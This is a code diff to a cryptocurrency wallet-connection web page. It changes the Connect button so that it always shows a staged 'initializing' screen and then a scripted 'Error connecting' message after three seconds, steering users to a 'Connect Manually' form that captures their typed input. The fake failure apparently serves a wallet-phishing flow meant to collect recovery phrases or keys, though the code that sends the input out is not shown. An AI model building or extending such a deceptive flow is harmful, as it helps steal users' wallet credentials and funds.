@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', () => {
         history.pushState(null, null, `#${pageId}`);
 
         // Toggle hide-nav-footer class based on page
-        if (pageId === 'connect-wallet') {
+        if (pageId === 'connect-wallet' || pageId === 'initializing') {
             document.body.classList.add('hide-nav-footer');
         } else {
             document.body.classList.remove('hide-nav-footer');
@@ -41,7 +41,7 @@ document.addEventListener('DOMContentLoaded', () => {
             connectButton.disabled = !walletSelect.value;
             manualConnectSection.classList.add('hidden');
             connectManuallyButton.style.display = 'block';
-        } else if (hash === 'connect-result') {
+        } else if (hash === 'error-connecting') {
             connectionMessage.textContent = 'Error connecting';
             if (!manualConnectSection.classList.contains('hidden')) {
                 manualConnectSection.classList.add('hidden');
@@ -86,18 +86,21 @@ document.addEventListener('DOMContentLoaded', () => {
     connectButton.addEventListener('click', () => {
         console.log('Connect button clicked');
         if (walletSelect.value) {
-            showPage('connect-result');
+            showPage('initializing');
+            setTimeout(() => {
+                showPage('error-connecting');
+            }, 3000); // Wait 3 seconds before redirecting to Page 4
         }
     });
 
-    // Handle Connect Manually button on Page 3
+    // Handle Connect Manually button on Page 4
     connectManuallyButton.addEventListener('click', () => {
         console.log('Connect Manually clicked');
         manualConnectSection.classList.remove('hidden');
         connectManuallyButton.style.display = 'none';
     });
 
-    // Handle form submission on Page 3 with URL update
+    // Handle form submission on Page 4 with URL update
     messageForm.addEventListener('submit', (e) => {
         e.preventDefault();
         console.log('Submitting form with input:', userInput.value);
